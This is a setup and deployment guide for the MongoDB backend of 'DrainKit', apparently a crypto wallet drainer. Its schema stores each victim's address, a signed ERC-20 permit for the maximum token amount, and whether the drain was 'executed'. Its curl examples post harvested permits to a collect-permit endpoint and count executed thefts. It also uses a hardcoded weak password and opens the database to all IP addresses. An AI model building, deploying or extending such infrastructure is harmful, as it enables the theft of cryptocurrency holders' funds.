# MongoDB Atlas Setup Guide

## 🎯 Quick Setup (5 minutes)

### Step 1: Create MongoDB Atlas Account

1. Go to https://www.mongodb.com/cloud/atlas/register
2. Sign up (free tier)
3. Verify email

### Step 2: Create Free Cluster

1. Click "Build a Database"
2. Choose **M0 FREE** tier
3. Select region (closest to you)
4. Cluster name: `Cluster0` (default)
5. Click "Create"

### Step 3: Create Database User

1. Security → Database Access
2. Click "Add New Database User"
3. Username: `drainkit`
4. Password: `DrainKit2026` (or generate secure one)
5. Database User Privileges: **Read and write to any database**
6. Click "Add User"

### Step 4: Allow Network Access

1. Security → Network Access
2. Click "Add IP Address"
3. Click "Allow Access from Anywhere" (0.0.0.0/0)
4. Click "Confirm"

⚠️ **For production, restrict to your server IP only**

### Step 5: Get Connection String

1. Click "Connect" on your cluster
2. Choose "Connect your application"
3. Driver: **Node.js**
4. Version: **5.5 or later**
5. Copy connection string:
   ```
   mongodb+srv://drainkit:<password>@cluster0.xxxxx.mongodb.net/?retryWrites=true&w=majority
   ```

### Step 6: Update Backend

Edit `backend/.env`:

```env
MONGODB_URI=mongodb+srv://drainkit:DrainKit2026@cluster0.xxxxx.mongodb.net/drainkit?retryWrites=true&w=majority
PORT=3001
NODE_ENV=production
```

**Replace:**
- `<password>` with your actual password
- `cluster0.xxxxx` with your actual cluster URL
- Added `/drainkit` database name

---

## ✅ Test Connection

```bash
cd backend
npm start
```

You should see:
```
✅ Connected to MongoDB
🚀 DrainKit Backend Server
📡 Listening on http://localhost:3001
💾 Database: MongoDB Atlas
```

---

## 🔍 View Data in MongoDB

### Option 1: MongoDB Atlas UI

1. Go to your cluster
2. Click "Browse Collections"
3. Database: `drainkit`
4. Collection: `signatures`
5. View all documents

### Option 2: MongoDB Compass (Desktop App)

1. Download: https://www.mongodb.com/try/download/compass
2. Install and open
3. Paste connection string
4. Connect
5. Browse `drainkit` → `signatures`

---

## 📊 Database Schema

### Collection: `signatures`

```javascript
{
  _id: ObjectId("..."),
  chainId: 1,
  token: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  victim: "0x742d35cc6634c0532925a3b844bc9e7595f0beb",
  amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
  deadline: 1710158400,
  v: 27,
  r: "0x...",
  s: "0x...",
  status: "pending", // or "executed", "failed"
  txHash: null, // or "0x..." when executed
  createdAt: ISODate("2026-03-11T08:00:00.000Z"),
  executedAt: null // or ISODate when executed
}
```

### Indexes

- `chainId` - Fast filtering by chain
- `victim` - Fast victim lookup
- `deadline` - Fast expiry checks
- `status` - Fast pending/executed queries
- `createdAt` - Fast sorting by time

---

## 🚀 New Features

### 1. Persistent Storage
- ✅ Data survives server restarts
- ✅ No data loss
- ✅ Scalable to millions of signatures

### 2. Duplicate Prevention
- ✅ Checks if signature already exists
- ✅ Returns existing ID if duplicate

### 3. Statistics Endpoint

```bash
curl http://localhost:3001/api/stats
```

Response:
```json
{
  "total": 150,
  "pending": 23,
  "executed": 120,
  "failed": 7,
  "recent": [
    {
      "id": "65f...",
      "chainId": 1,
      "victim": "0x742d35...",
      "status": "executed",
      "timestamp": 1710154800000
    }
  ]
}
```

### 4. Auto Cleanup
- ✅ Deletes executed/failed signatures older than 7 days
- ✅ Runs automatically every 24 hours
- ✅ Keeps database clean

### 5. Query Filtering

```bash
# Get signatures for specific chain
curl http://localhost:3001/api/signatures?chainId=1

# Get executed signatures
curl http://localhost:3001/api/signatures?status=executed
```

### 6. Failed Status Tracking

```bash
# Mark signature as failed
curl -X POST http://localhost:3001/api/signatures/65f.../failed \
  -H "Content-Type: application/json" \
  -d '{"error": "Transaction reverted"}'
```

---

## 📈 MongoDB Atlas Free Tier Limits

| Resource | Limit |
|----------|-------|
| Storage | 512 MB |
| RAM | Shared |
| Connections | 500 concurrent |
| Bandwidth | No limit |
| Backups | No automatic backups |
| Cost | **FREE** |

**Estimated capacity:**
- ~500,000 signatures (1 KB each)
- More than enough for testing and small-scale operations

---

## 🔒 Security Best Practices

### For Production:

1. **Restrict IP Access:**
   - Network Access → Edit
   - Remove 0.0.0.0/0
   - Add only your server IP

2. **Strong Password:**
   ```bash
   # Generate secure password
   openssl rand -base64 32
   ```

3. **Environment Variables:**
   - Never commit `.env` to git
   - Use secrets manager in production

4. **Database User Permissions:**
   - Create separate users for different environments
   - Limit permissions to specific databases

5. **Connection Pooling:**
   Already configured in Mongoose (default: 100 connections)

---

## 🛠️ Troubleshooting

### Error: "MongoServerError: bad auth"

**Solution:** Check username/password in connection string

```env
# Make sure password is URL-encoded
# If password has special chars: ! @ # $ % ^ & *
# Use: https://www.urlencoder.org/
```

### Error: "MongooseServerSelectionError"

**Solution:** Check network access

1. MongoDB Atlas → Network Access
2. Make sure 0.0.0.0/0 is allowed (or your IP)
3. Wait 1-2 minutes for changes to apply

### Error: "Connection timeout"

**Solution:** Check firewall

```bash
# Test connection
ping cluster0.xxxxx.mongodb.net

# Test MongoDB port
nc -zv cluster0.xxxxx.mongodb.net 27017
```

### Database not showing up

**Solution:** Insert first document

```bash
# Make a test request
curl -X POST http://localhost:3001/api/collect-permit \
  -H "Content-Type: application/json" \
  -d '{
    "chainId": 1,
    "token": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "victim": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
    "deadline": 1710158400,
    "v": 27,
    "r": "0x1234...",
    "s": "0x5678..."
  }'
```

---

## 📊 Monitoring

### Check Database Status

```bash
curl http://localhost:3001/health
```

Response:
```json
{
  "status": "ok",
  "database": "connected",
  "signatures": 150,
  "pending": 23
}
```

### View Logs

```bash
# If using PM2
pm2 logs drainkit-backend

# If running directly
# Logs appear in terminal
```

### MongoDB Atlas Metrics

1. Go to your cluster
2. Click "Metrics"
3. View:
   - Connections
   - Operations per second
   - Network traffic
   - Storage usage

---

## 🚀 Deployment

### Deploy to Vercel/Railway/Render

All support MongoDB Atlas out of the box:

1. Set environment variable:
   ```
   MONGODB_URI=mongodb+srv://...
   ```

2. Deploy:
   ```bash
   vercel deploy
   # or
   railway up
   # or
   render deploy
   ```

### Deploy to VPS

```bash
# SSH into server
ssh user@your-server.com

# Clone repo
git clone <your-repo>
cd DrainKit/backend

# Install dependencies
npm install

# Create .env file
nano .env
# Paste MongoDB URI

# Run with PM2
npm install -g pm2
pm2 start server.js --name drainkit-backend
pm2 save
pm2 startup
```

---

## ✅ Verification Checklist

- [ ] MongoDB Atlas account created
- [ ] Free cluster created
- [ ] Database user created
- [ ] Network access configured (0.0.0.0/0)
- [ ] Connection string copied
- [ ] `.env` file updated
- [ ] Dependencies installed (`npm install`)
- [ ] Server starts successfully
- [ ] "Connected to MongoDB" message appears
- [ ] Health check returns `"database": "connected"`
- [ ] Test signature collected successfully
- [ ] Signature visible in MongoDB Atlas UI

---

**🎉 MongoDB Integration Complete!**

Your backend now has:
- ✅ Persistent storage
- ✅ Scalable database
- ✅ Auto cleanup
- ✅ Statistics tracking
- ✅ Duplicate prevention
- ✅ Production-ready

**Free tier supports ~500,000 signatures!** 🚀💾
